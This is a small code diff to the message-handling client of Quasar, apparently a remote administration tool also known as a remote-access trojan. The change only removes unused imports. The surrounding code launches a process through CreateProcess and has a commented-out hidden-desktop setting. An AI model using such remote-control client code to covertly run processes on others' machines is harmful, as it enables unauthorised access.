@@ -2,15 +2,10 @@
 using Quasar.Common.Messages;
 using Quasar.Common.Networking;
 using System;
-using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
-using System.Linq;
 using System.Runtime.InteropServices;
-using System.Text;
 using System.Threading;
-using System.Threading.Tasks;
-using System.Windows.Forms;
 
 namespace Quasar.Client.Messages
 {
@@ -82,6 +77,7 @@ namespace Quasar.Client.Messages
                     NativeMethods.PROCESS_INFORMATION process_INFORMATION = default(NativeMethods.PROCESS_INFORMATION);
                     structure.cb = (uint)Marshal.SizeOf<NativeMethods.STARTUPINFO>(structure);
                     // structure.lpDesktop = client.currentDesktopString;
+                    
                     
                     if (!NativeMethods.CreateProcess(null, string.Format("\"{0}\" \"{1}\" \"{2}\"", text10, text9, num), IntPtr.Zero, IntPtr.Zero, false, 0U, IntPtr.Zero, null, ref structure, out process_INFORMATION))
                     {
